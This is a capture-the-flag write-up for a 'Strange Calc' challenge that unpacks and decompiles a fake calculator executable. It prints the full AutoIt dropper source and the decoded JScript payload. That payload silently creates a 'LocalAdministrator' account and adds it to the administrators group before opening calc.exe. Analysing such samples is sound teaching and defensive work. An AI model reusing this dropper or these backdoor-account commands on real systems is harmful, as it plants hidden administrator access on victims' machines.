---
title: HuntressCTF 2024 Strange Calc
draft: false
tags:
  - ctf
  - reverse-engineering
  - upx
  - autoit3
  - deobfuscation
---

# Strange Calc

> I got this new calculator app from my friend! But it's really weird, for some reason it needs admin permissions to run?? 

Taking a look at `file calc.exe`, we can see `calc.exe: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed` which means it's a Windows executable and also packed with UPX. 

We can unpack it with [UPX](https://upx.github.io/) by running `upx -d calc.exe`. Once unpacked, I decided to analyze the strings using [flare-floss](https://github.com/mandiant/flare-floss) to see if there's any encoded or dynamically generated strings. 

```
\t<assemblyIdentity
\t    type="win32"
\t    processorArchitecture="*"
\t    version="3.0.0.0"
\t    name="AutoIt3"
```

The string `AutoIt3` is a dead giveaway that this is an AutoIt script compiled into an executable. We can decompile it using [AutoIT Extractor](https://github.com/digitalsleuth/autoit-extractor) and get the source code. 

```autoit
; <AUT2EXE VERSION: 3.2.4.9>
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Users\johnh\Desktop\Desktop\otto_calculator.au3>
; ----------------------------------------------------------------------------
#NoTrayIcon
#Region
#AutoIt3Wrapper_Change2CUI=y
#EndRegion
If Not IsAdmin() Then
    MsgBox(16, "Error", "You must have administrator privileges.")
    Exit
EndIf
Local $a = "I0B+XmNRTUFBQT09VyF4XkRrS3hQbWAoYgk3bC5QMSdFRUJOJyggL2FWa0RjRS0JSippV1cuYzdsLlB/eCFwK0AhW2NWK1VMRHRJKzNRKgktbUQsMCc5JH9EUk0rMlZtbW5jSjcta1F1Jy9fZiZMfkVCKmlyMGNXY2tVTn9hcjZgRTh/b2tVRSoneCdaay0wIGJ4OSs2fTB2RSsJTkUjeyd4VC11MHt4J3JKIzFHVVlieCErSVxDLixveGA2IG00bC4vS04rKU92IWJPMisqW38yaTZXRHZcbS5QNCdxaTRAIVcgXit4VE90cHRfeypiCWIwdnRRJkAqeDZScysJTFk0Izguf2wzSS1tRH5re2M2Ul40bE1aVzkrek9gNCNSJnkjJ38yfkx7YzBjbXRtLi9XOSt6WWN0UXEqT2YgKid2Mn5WeHYwUl40bUQvVzluelljNF95I08yICondjJ+cyd2MCBeNGxEO0dOf2JZdjRRJipPMiBiW39mcG1RJ1VPRGJ4TCA2RFdoLzRsLlpLW39gY2JAIUAhICMtYE5AKkAqVyNiaWIwYzQzIEAhNiBWf3hvRDRSRiptMydqWS5yCW8gME1HOjt0Qy47V05uY3ZgJVs4WCpAIUAhVyMtYDNAKkAqeWIjcGtXYDRfZkAhNlJWf1VvRHRPOGJeX3s/RERyeEwgNkRHOjs0bE1aR1t/YGBjVkwmYkAhQCF/KnVzKjgpRCtERU1VUDFSZEUoL08uYnhvdlR+VCM4N0MuUHMncjRub3JVLHYqYyxSLQlNMW81YiwJSklSZmAiMXdgXUJ2dWIsO15xUiZ7MlMuT2YwL3YoLFtAIShjJiJ6Un8hSX5xS00tVXwneG54OUVpN2wufgknbGNoKmktbE1+Sycscnh/WVAhL38uUGRXXmxeYltoYnhra09EbVlXTX5FXwlfclAmbFtbcn5FeH9PUF5XXkNeb0RHO2FQQ05zcglrZEREbVlXTS8sSlcxbHNiOTpyVWIvWU1DWUtEUEpDW05yfnJtQ1ZeIH82bkpZSVxtRH4ye3grQX56bU9rN25vcjhOKzFZYEV/VV5EYndPUlV0bnNeQiNwV1dNYFxtLn47eyFwO0AhVyBzf3hMWTRSRnA7UVEqCXcgXSF4Y1ddNVl+VEIwbVYvfyMpMlIiRVVgSyQrREJGfjZDVmsrI3A0UkFCQUE9PV4jfkA="
Local $b = x($a)
Local $c = r(4) & r(2) & r(3) & r(1) & ".jse"
Func r($aa)
    Local $zz = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    Local $s = ""
    For $i = 1 To $aa
        $s &= StringMid($zz, Random(1, StringLen($zz), 1), 1)
    Next
    Return $s
EndFunc   ;==>r
Local $d = FileOpen($c, 2)
If $d = -1 Then
    MsgBox(16, "Error", "Failed to open the calculator.")
    Exit
EndIf
FileWrite($d, $b)
FileClose($d)
FileSetAttrib($c, "+H")
FileSetAttrib($c, "+S")
Func x($e)
    Local $f = DllStructCreate("dword")
    DllCall("crypt32.dll", "int", "CryptStringToBinaryA", _
            "str", $e, _
            "dword", StringLen($e), _
            "dword", 1, _
            "ptr", 0, _
            "ptr", DllStructGetPtr($f), _
            "ptr", 0, _
            "ptr", 0)
    Local $g = DllStructCreate("byte[" & DllStructGetData($f, 1) & "]")
    DllCall("crypt32.dll", "int", "CryptStringToBinaryA", _
            "str", $e, _
            "dword", StringLen($e), _
            "dword", 1, _
            "ptr", DllStructGetPtr($g), _
            "ptr", DllStructGetPtr($f), _
            "ptr", 0, _
            "ptr", 0)
    Return BinaryToString(DllStructGetData($g, 1))
EndFunc   ;==>x
$o = ObjCreate("MSScriptControl.ScriptControl")
$o.Language = "JScript"
$p = "new ActiveXObject('WScript.Shell').Run('wscript.exe " & $c & "',1,false);"
$o.ExecuteStatement($p)
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Users\johnh\Desktop\Desktop\otto_calculator.au3>
; ----------------------------------------------------------------------------
```

We can see an interesting string `$a` that is encoded and decoded using the `x` function. The decoded string is then written to a file `r(4) & r(2) & r(3) & r(1) & ".jse"` and executed using `MSScriptControl.ScriptControl`. We can [base64 decode the string and then convert from Microsoft Script encoding](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Microsoft_Script_Decoder()&input=STBCK1htTlJUVUZCUVQwOVZ5RjRYa1JyUzNoUWJXQW9ZZ2szYkM1UU1TZEZSVUpPSnlnZ0wyRldhMFJqUlMwSlNpcHBWMWN1WXpkc0xsQi9lQ0Z3SzBBaFcyTldLMVZNUkhSSkt6TlJLZ2t0YlVRc01DYzVKSDlFVWswck1sWnRiVzVqU2pjdGExRjFKeTlmWmlaTWZrVkNLbWx5TUdOWFkydFZUbjloY2paZ1JUaC9iMnRWUlNvbmVDZGFheTB3SUdKNE9TczJmVEIyUlNzSlRrVWpleWQ0VkMxMU1IdDRKM0pLSXpGSFZWbGllQ0VyU1Z4RExpeHZlR0EySUcwMGJDNHZTMDRyS1U5MklXSlBNaXNxVzM4eWFUWlhSSFpjYlM1UU5DZHhhVFJBSVZjZ1hpdDRWRTkwY0hSZmV5cGlDV0l3ZG5SUkprQXFlRFpTY3lzSlRGazBJemd1ZjJ3elNTMXRSSDVyZTJNMlVsNDBiRTFhVnprcmVrOWdOQ05TSm5rakozOHlma3g3WXpCamJYUnRMaTlYT1N0NldXTjBVWEVxVDJZZ0tpZDJNbjVXZUhZd1VsNDBiVVF2VnpsdWVsbGpORjk1STA4eUlDb25kakorY3lkMk1DQmVOR3hFTzBkT2YySlpkalJSSmlwUE1pQmlXMzltY0cxUkoxVlBSR0o0VENBMlJGZG9MelJzTGxwTFczOWdZMkpBSVVBaElDTXRZRTVBS2tBcVZ5TmlhV0l3WXpReklFQWhOaUJXZjNodlJEUlNSaXB0TXlkcVdTNXlDVzhnTUUxSE9qdDBReTQ3VjA1dVkzWmdKVnM0V0NwQUlVQWhWeU10WUROQUtrQXFlV0lqY0d0WFlEUmZaa0FoTmxKV2YxVnZSSFJQT0dKZVgzcy9SRVJ5ZUV3Z05rUkhPanMwYkUxYVIxdC9ZR0JqVmt3bVlrQWhRQ0YvS25WektqZ3BSQ3RFUlUxVlVERlNaRVVvTDA4dVluaHZkbFIrVkNNNE4wTXVVSE1uY2pSdWIzSlZMSFlxWXl4U0xRbE5NVzgxWWl3SlNrbFNabUFpTVhkZ1hVSjJkV0lzTzE1eFVpWjdNbE11VDJZd0wzWW9MRnRBSVNoakppSjZVbjhoU1g1eFMwMHRWWHduZUc1NE9VVnBOMnd1ZmdrbmJHTm9LbWt0YkUxK1N5Y3NjbmgvV1ZBaEwzOHVVR1JYWG14ZVlsdG9ZbmhyYTA5RWJWbFhUWDVGWHdsZmNsQW1iRnRiY241RmVIOVBVRjVYWGtOZWIwUkhPMkZRUTA1emNnbHJaRVJFYlZsWFRTOHNTbGN4YkhOaU9UcHlWV0l2V1UxRFdVdEVVRXBEVzA1eWZuSnRRMVplSUg4MmJrcFpTVnh0Ukg0eWUzZ3JRWDU2YlU5ck4yNXZjamhPS3pGWllFVi9WVjVFWW5kUFVsVjBibk5lUWlOd1YxZE5ZRnh0TG40N2V5RndPMEFoVnlCemYzaE1XVFJTUm5BN1VWRXFDWGNnWFNGNFkxZGROVmwrVkVJd2JWWXZmeU1wTWxJaVJWVmdTeVFyUkVKR2ZqWkRWbXNySTNBMFVrRkNRVUU5UFY0amZrQT0&oeol=NEL) to get the plaintext code.

```javascript
function a(b){var c="",d=b.split("\n");for(var e=0;e<d.length;e++){var f=d[e].replace(/^\s+|\s+$/g,'');if(f.indexOf("begin")===0||f.indexOf("end")===0||f==="")continue;var g=(f.charCodeAt(0)-32)&63;for(var h=1;h<f.length;h+=4){if(h+3>=f.length)break;var i=(f.charCodeAt(h)-32)&63,j=(f.charCodeAt(h+1)-32)&63,k=(f.charCodeAt(h+2)-32)&63,l=(f.charCodeAt(h+3)-32)&63;c+=String.fromCharCode((i<<2)|(j>>4));if(h+2<f.length-1)c+=String.fromCharCode(((j&15)<<4)|(k>>2));if(h+3<f.length-1)c+=String.fromCharCode(((k&3)<<6)|l)}}return c.substring(0,g)}var m="begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";var n=a(m);var o=["net user LocalAdministrator "+n+" /add","net localgroup administrators LocalAdministrator /add","calc.exe"];var p=new ActiveXObject('WScript.Shell');for(var q=0;q<o.length-1;q++){p.Run(o[q],0,false)}p.Run(o[2],1,false);
```

Lastly, I converted the Javascript code to Python and ran it to get the flag. 

```python
import subprocess

def decode_base64(encoded_string):
    decoded_string = ""
    lines = encoded_string.split("\n")

    for line in lines:
        current_line = line.strip()

        char_offset = (ord(current_line[0]) - 32) & 63

        for h in range(1, len(current_line), 4):
            if h + 3 >= len(current_line):
                break

            i = (ord(current_line[h]) - 32) & 63
            j = (ord(current_line[h + 1]) - 32) & 63
            k = (ord(current_line[h + 2]) - 32) & 63
            l = (ord(current_line[h + 3]) - 32) & 63

            decoded_string += chr((i << 2) | (j >> 4))

            if h + 2 < len(current_line) - 1:
                decoded_string += chr(((j & 15) << 4) | (k >> 2))

            if h + 3 < len(current_line) - 1:
                decoded_string += chr(((k & 3) << 6) | l)

    return decoded_string[:char_offset]

encoded_string = "G9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*"
decoded_value = decode_base64(encoded_string)
print(decoded_value)
```

And we get the flag!